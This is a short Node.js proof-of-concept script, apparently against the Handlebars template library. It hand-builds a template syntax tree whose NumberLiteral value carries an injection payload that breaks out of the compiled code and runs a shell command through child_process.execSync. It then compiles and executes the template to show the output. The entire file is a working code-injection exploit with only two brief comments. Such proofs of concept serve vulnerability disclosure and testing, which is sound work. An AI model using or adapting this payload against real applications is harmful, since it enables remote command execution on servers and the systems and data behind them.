const Handlebars = require('handlebars');

// Hand-built AST for: {{lookup this 1}}
// but with NumberLiteral.value replaced by an injection payload
const maliciousAst = {
  type: "Program",
  body: [
    {
      type: "MustacheStatement",
      path: {
        type: "PathExpression",
        data: false,
        depth: 0,
        parts: ["lookup"],
        original: "lookup",
        loc: { start: { line: 1, column: 2 }, end: { line: 1, column: 8 } }
      },
      params: [
        {
          type: "PathExpression",
          data: false,
          depth: 0,
          parts: [],
          original: "this",
          loc: { start: { line: 1, column: 9 }, end: { line: 1, column: 13 } }
        },
        {
          type: "NumberLiteral",
          value: "1}},{}) + global.process.mainModule.require('child_process').execSync('id').toString() //",
          original: 1,
          loc: { start: { line: 1, column: 14 }, end: { line: 1, column: 15 } }
        }
      ],
      escaped: true,
      strip: { open: false, close: false },
      loc: { start: { line: 1, column: 0 }, end: { line: 1, column: 17 } }
    }
  ],
  strip: {},
  loc: { start: { line: 1, column: 0 }, end: { line: 1, column: 17 } }
};

try {
  const template = Handlebars.compile(maliciousAst);
  const result = template({});
  console.log("OUTPUT:", result);
} catch (e) {
  console.log("ERROR:", e.message);
}
